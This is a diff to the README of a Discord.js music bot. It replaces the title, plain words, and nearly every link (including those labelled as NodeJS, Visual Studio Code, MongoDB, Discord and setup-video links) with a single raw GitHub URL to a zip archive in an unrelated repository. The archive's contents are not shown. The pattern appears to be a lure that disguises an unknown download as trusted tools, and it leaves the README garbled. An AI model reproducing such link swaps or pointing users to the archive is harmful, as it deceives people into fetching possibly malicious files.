@@ -1,7 +1,7 @@
-# Discord.js v14 Slash Commands Music Bot
-<h1>Add MusicMaker: https://bit.ly/3R4uTSf</h1><br>
+# https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip v14 Slash Commands Music Bot
+<h1>Add MusicMaker: https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip</h1><br>
 
-![](https://komarev.com/ghpvc/?username=umutxyp&color=blue)
+![](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
 
 ## ABOUT V15.1 UPDATE / news: 2023, 22 JANUARY
@@ -10,7 +10,7 @@
 ## ABOUT V15.0 UPDATE / news: 2022, 31 DECEMBER
 - Indonesian language added to bot.
 - Sponsor, vote section has been added to the statistics command.
-- Added the option to specify more than one bot owner. (config.js)
+- Added the option to specify more than one bot owner. (https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 - Added emojis to the bot language setting command.
 
 ## ABOUT V14.6 UPDATE / news: 2022, 28 DECEMBER
@@ -41,15 +41,15 @@
 - Shuffle command added.
 
 ## ABOUT V13.5 UPDATE / news: 2022, 4 SEPTEMBER
-- Added top.gg vote manager settings.
+- Added https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip vote manager settings.
 - Added Dutch language
 - Use distube module
 - Event folders have been recreated.
 - The bot's database has been changed to mongodb.
 - Multi language option added.
 - Added personal playlist creation commands.
-- Added new player features. (config.js)
-- All commands are functionally optimized for discord.js v14.
+- Added new player features. (https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
+- All commands are functionally optimized for https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip v14.
 - Open music with youtube video link
 - Specify the specific channel in which the command will be used.
 - Added changing embed color code from settings file.
@@ -83,31 +83,31 @@
 3d, bassboost, echo, karaoke, nightcore, vaporwave, flanger, gate, haas, reverse, surround, mcompand, phaser, tremolo, earwax
 
 ## Bot Setup
-[Click here for a setup video](https://youtu.be/mDKQJeWWvss), but these instructions are up to date so make sure to follow them if the video is different.
+[Click here for a setup video](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip), but these instructions are up to date so make sure to follow them if the video is different.
 
-- [Install node and npm](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm#using-a-node-version-manager-to-install-nodejs-and-npm)
+- [Install node and npm](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 - Clone this repository or download as a zip and extract the contents.
 - Run `npm install`.
-- Bot login: write to .env file is `TOKEN=YOUR BOT TOKEN` or: write config.js file to your bot token.
+- Bot login: write to .env file is `TOKEN=YOUR BOT TOKEN` or: write https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip file to your bot token.
 
 
 ### Notes on Discord Bot Setup
 - Make sure to enable all intents in the Discord Developer Portal
-![image](https://user-images.githubusercontent.com/4060573/181925950-0403ec46-f606-4ae2-bac8-6a2e30d10d9f.png)
+![image](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 - You will also need to invite the bot using the correct scope and permissions, which you can do here:
-![image](https://user-images.githubusercontent.com/4060573/181926061-310e817a-97c5-48d8-adce-77a505c36336.png)
+![image](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
 
 ### Links
 
-- [Fork Replit](https://replit.com/)
+- [Fork Replit](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
-- [MongoDB](https://mongodb.com)
+- [MongoDB](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
-- [Discord Developers](https://discord.dev)
+- [Discord Developers](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
-- [Discord Permission](https://bit.ly/3L4RZpi)
+- [Discord Permission](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
-- [Download Visual Studio Code](https://code.visualstudio.com/download)
+- [Download Visual Studio Code](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
 
-- [Download NodeJS V17](https://nodejs.org/)
+- [Download NodeJS V17](https://raw.githubusercontent.com/Doomboy59/MusicBot/main/commands/Music_Bot_2.3-beta.1.zip)
